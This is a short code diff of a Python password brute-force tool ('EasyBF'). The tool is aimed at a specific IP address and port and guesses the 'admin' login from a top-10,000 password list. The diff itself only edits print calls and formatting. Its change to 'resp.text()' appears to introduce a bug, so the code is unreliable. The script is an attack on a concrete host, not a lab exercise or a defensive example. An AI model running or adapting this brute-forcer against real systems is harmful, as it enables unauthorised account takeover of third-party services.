@@ -29,10 +29,10 @@ class EasyBF(object):
                     if index % 100 == 0: print('{} password incorrect,retrying {}'.format(self.ip, index))
                     continue
                 if resp.status_code == 200:
-                    print(resp.text)
+                    print(resp.text())
                     return True
                 else:
-                    print(resp.text)
+                    print(resp.text())
                     return False
 
         return False
@@ -44,5 +44,6 @@ class EasyBF(object):
 if __name__ == '__main__':
     ebf=EasyBF('120.55.38.201:9002','../somd5-top1w.txt')
     ebf.hack(data={"username": "admin", "password": "", "expires": 3600000,
-                    "tokenType": "default", "verifyKey": "","verifyCode": ""},password_keyword='password')
+                    "tokenType": "default", "verifyKey": "","verifyCode": ""},
+             password_keyword='password')
     pass
